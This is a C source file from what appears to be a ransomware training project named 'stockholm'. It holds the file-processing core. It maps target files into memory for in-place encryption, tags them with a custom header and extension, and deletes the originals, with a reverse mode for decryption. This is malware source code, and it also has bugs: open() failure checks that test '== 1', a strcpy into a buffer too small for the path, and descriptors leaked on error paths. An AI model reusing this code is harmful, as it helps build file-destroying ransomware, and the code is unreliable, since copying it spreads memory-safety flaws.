#include "stockholm.h"

// Verify that the file header's magic number is ours
bool is_magic_nbr_correct(const unsigned char *data)
{
    return strncmp((const char *)data, SH_SIGNATURE, SH_STOCKHLM_HEADER_SIZE) == 0;
}

int map_file_into_memory(t_env *env, const char *filename)
{
    // Open the target binary file
    int fd = open(filename, O_RDONLY);
    if (fd < 0) return SH_ERROR;
    
    // Determine the file size by moving the cursor till the end
    off_t res = lseek(fd, 0, SEEK_END);
    // Check that lseek didn't fail and not returning > int max
    if (res < 0 || res > 2147483647) return SH_ERROR;

    printf("res: %ld\n", res);

    // Put back the cursor at the beginning of the file
    if (lseek(fd, 0, SEEK_SET) < 0) return SH_ERROR;

    /* Map the file into memory
        - PROT_READ: read-only access
        - PROT_WRITE: write-only access
            We use both READ and WRITE since we are going to encrypt the
            mapped region directly.
        - MAP_PRIVATE: creates a private copy of the mapped data, so any
        modifications made to the mapped memory will not be visible
        to other processes mapping the same file
    */

    env->g_mapped_data =
        mmap(NULL, res, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (env->g_mapped_data == MAP_FAILED)
    {
        close(fd);
        return SH_ERROR;
    }

    close(fd); // No need to keep the fd since the file is mapped

    if (env->g_modes & SH_REVERSE)
    {
        if (!is_magic_nbr_correct(env->g_mapped_data)) {
            if (env->g_modes & SH_VERBOSE)
                printf("Signature not found in the file header, abort decryption...\n");
            return SH_ERROR;
        }

        // Copy the custom header of the encrypted file to the env->global variable
        memcpy(&env->g_stockhlm_header, env->g_mapped_data, SH_STOCKHLM_HEADER_SIZE);
        // Save the encrypted file size without the added custom header size
        env->g_encrypted_filesize = res - SH_STOCKHLM_HEADER_SIZE;
    } else {
        if (is_magic_nbr_correct(env->g_mapped_data)) {
            if (env->g_modes & SH_VERBOSE)
                printf("Signature found in the file header, abort encryption...\n");
            return SH_ERROR;
        }
        env->g_stockhlm_header.original_filesize = res;
    }

    // // Abort if the current target already contains our signature
    // if (search_binary((char *)g_mapped_data, g_stockhlm_header.original_filesize, SH_SIGNATURE))
    //     return 1;

    return SH_SUCCESS;
}

bool write_encrypted_data_to_file(t_env *env, const char *target_path)
{
    char    new_target_path[1024]; // Create a buffer to hold the full path
    int     outfilefd;

    // Use snprintf() to safely concatenate the strings and get the file path
    //  with our custom extension
    snprintf(
        new_target_path, sizeof(new_target_path),
        "%s.%s", target_path, SH_STOCKHLM_EXT
    );

    outfilefd = open(new_target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);        

    // Check if open() has failed
    if (outfilefd == 1) return SH_ERROR;

    // Write the custom header first to the outfile
    ssize_t bytes_written = write(outfilefd, &env->g_stockhlm_header, SH_STOCKHLM_HEADER_SIZE);
    if (bytes_written < 0) return SH_ERROR;

    // Then write the processed data to the outfile
    bytes_written = write(outfilefd, env->g_mapped_data, env->g_encrypted_filesize);
    if (bytes_written < 0) return SH_ERROR;

    close(outfilefd);
    return SH_SUCCESS;
}

bool write_decrypted_data_to_file(t_env *env, char *target_path)
{
    int     outfilefd;

    // We remove our custom extension by terminating the filename earlier.
    target_path[strlen(target_path) - SH_STOCKHLM_EXT_SIZE] = '\0';

    // 0755: rwx for owner, rx for group and others
    outfilefd = open(target_path, O_CREAT | O_RDWR | O_TRUNC, 0755);

    // Check if open() has failed
    if (outfilefd == 1) return SH_ERROR;

    // Write the processed data to the outfile
    ssize_t bytes_written = write(
        outfilefd,
        env->g_mapped_data + SH_STOCKHLM_HEADER_SIZE, // Don't keep the custom header
        env->g_stockhlm_header.original_filesize
    );
    if (bytes_written < 0) return SH_ERROR;

    close(outfilefd);
    return SH_SUCCESS;
}

// Write the processed file data back to a new file
int write_processed_data_to_file(t_env *env, const char *target_path)
{
    char    temp_path[strlen(target_path) - 1];
    // Copy the original string to the temporary variable
    strcpy(temp_path, target_path);

    if (env->g_modes & SH_REVERSE)
    {
        if (write_decrypted_data_to_file(env, (char *)target_path) == SH_ERROR)
            return SH_ERROR;
        munmap(env->g_mapped_data, env->g_encrypted_filesize + SH_STOCKHLM_HEADER_SIZE);
    } else
    {
        if (write_encrypted_data_to_file(env, target_path) == SH_ERROR)
            return SH_ERROR;
        munmap(env->g_mapped_data, env->g_stockhlm_header.original_filesize);
    }

    // Remove the old file from the system
    if (remove(temp_path) != 0) return SH_ERROR;

    return SH_SUCCESS;
}
